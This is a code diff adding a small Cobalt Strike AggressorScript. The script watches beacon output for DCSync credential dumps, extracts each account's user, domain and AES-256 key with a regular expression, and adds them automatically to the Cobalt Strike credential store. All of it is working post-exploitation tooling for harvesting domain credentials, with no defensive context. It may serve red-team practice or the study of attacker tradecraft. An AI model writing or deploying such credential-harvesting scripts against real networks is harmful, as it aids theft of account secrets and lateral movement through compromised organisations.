@@ -1,0 +1,13 @@
+##AggressorScript to load AES 256 hashes from DCsync into Cobalt Strike Credentials store
+
+
+on beacon_output {
+	if ($2 hasmatch '.*Default Salt : (\w*[A-Z]\.*\w*[A-Z])(.*)[\n\r].*Default Iterations : 4096[\n\r].*Credentials.*[\n\r].*aes256_hmac       \(4096\) : (.*)'){
+		$user = matched()[1];
+		$domain = matched()[0];
+		$aeshash = matched()[2];
+		credential_add($user,$aeshash,$domain,"dcsync",binfo($1,"internal"));
+	}
+}
+
+
